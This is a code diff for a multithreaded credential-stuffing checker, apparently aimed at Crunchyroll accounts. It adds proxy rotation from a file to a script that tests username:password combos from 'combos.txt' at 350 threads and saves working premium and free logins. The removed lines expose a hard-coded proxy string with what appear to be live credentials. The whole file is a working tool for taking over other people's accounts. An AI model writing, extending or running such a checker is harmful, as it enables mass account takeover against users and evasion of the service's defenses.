@@ -1,4 +1,7 @@
+import os
+import sys
 from concurrent.futures import ThreadPoolExecutor
+from itertools import cycle
 
 import requests
 import json
@@ -6,15 +9,37 @@ import time
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
+checks_done = 0
 
-def process_account(account):
+def update_title(name, cpm, proxies_count, accounts_count):
+    title = f"{name}, {cpm:.2f} CPM, {proxies_count} Proxies, {accounts_count} Accounts Loaded"
+    if "idlelib.run" in sys.modules:
+        print(title)  # If running in an IDE, print the title
+    else:
+        os.system(f"title {title}")  # If running in the command prompt, set the window title
+
+def calculate_cpm(start_time, checks_done):
+    elapsed_time = time.time() - start_time
+    if elapsed_time == 0:
+        return 0
+    cpm = (checks_done / elapsed_time) * 60
+    return cpm
+
+def process_account(account_proxy_tuple):
+    global checks_done
+
+    account, proxy = account_proxy_tuple
     if len(account) != 2:
         print(f"Invalid account format: {account}")
         return None
 
     username, password = account
-    is_premium = check_account(username, password)
+    is_premium = check_account(username, password, proxy)
+
+    checks_done += 1
+
     return (username, password, is_premium)
+
 def read_accounts_from_file(filename):
     accounts = []
     with open(filename, 'r') as f:
@@ -22,6 +47,14 @@ def read_accounts_from_file(filename):
             account = tuple(line.strip().split(':'))
             accounts.append(account)
     return accounts
+
+def read_proxies_from_file(filename):
+    proxies = []
+    with open(filename, 'r') as f:
+        for line in f:
+            proxy = line.strip()
+            proxies.append(proxy)
+    return proxies
 
 
 def create_session_with_retry(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 503, 504)):
@@ -38,9 +71,10 @@ def create_session_with_retry(retries=3, backoff_factor=0.3, status_forcelist=(5
     session.mount('https://', adapter)
 
     return session
-def check_account(username, password):
-
-    proxy = "gw.thunderproxies.net:5959:thunderZ7lW7KfS10U-dc-ANY:htmnjzTbJxsUXZw49J"
+def save_to_file(filename, content):
+    with open(filename, 'a') as f:
+        f.write(content + "\n")
+def check_account(username, password,proxy):
     ip, port, user, pwd = proxy.split(":")
     proxy_dict = {
         "http": f"http://{user}:{pwd}@{ip}:{port}",
@@ -117,19 +151,22 @@ def check_account(username, password):
         return None
 
 accounts = read_accounts_from_file('combos.txt')
+proxies = read_proxies_from_file('proxies.txt')
+proxy_cycle = cycle(proxies)
+account_proxy_pairs = [(account, next(proxy_cycle)) for account in accounts]
 
 # Print the number of accounts imported
 total_accounts = len(accounts)
 print("Total accounts imported:", total_accounts)
 
+proxies = read_proxies_from_file('proxies.txt')
+account_proxy_tuples = [(account, proxies[i % len(proxies)]) for i, account in enumerate(accounts)]
+
 max_threads = 350  # Adjust the number of threads based on your needs
+start_time = time.time()
+
 with ThreadPoolExecutor(max_threads) as executor:
-    results = executor.map(process_account, accounts)
-
-
-def save_to_file(filename, content):
-    with open(filename, 'a') as f:
-        f.write(content + "\n")
+    results = executor.map(process_account, account_proxy_tuples)
 
 for result in results:
     if result is None:
@@ -144,9 +181,7 @@ for result in results:
         print(f"{username}:{password}:Free")
         save_to_file("free.txt", f"{username}:{password}:Free")
 
-
-
-
-
-
-
+while True:
+    time.sleep(3)  # Update the title every 3 seconds
+    cpm = calculate_cpm(start_time, checks_done)
+    update_title("Crunchy", cpm, len(proxies), len(accounts))
